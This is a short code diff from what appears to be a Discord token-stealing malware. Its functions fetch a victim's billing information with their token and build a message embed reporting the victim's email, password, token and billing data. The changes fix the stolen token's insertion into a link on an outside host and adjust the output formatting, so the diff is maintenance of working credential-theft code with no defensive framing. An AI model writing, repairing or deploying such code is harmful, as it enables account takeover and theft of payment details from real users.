@@ -469,7 +469,7 @@ const fetchBilling = async (token) => {
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (!data) return '❌';
+  if (!data) return '\`No\`';
   let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
@@ -483,7 +483,7 @@ const getBilling = async (token) => {
       }
     }
   });
-  if (!billing) billing = '❌';
+  if (!billing) billing = '\`No\`';
   return billing;
 };
 
@@ -585,7 +585,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '<a:946246524634009600:990956317101424650> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
@@ -595,7 +595,7 @@ const login = async (email, password, token) => {
           },
           {
             name: '<a:946246524524978196:990956270624325662> Billing:',
-            value: `**${billing}**`,
+            value: `${billing}`,
             inline: true,
           },
           {
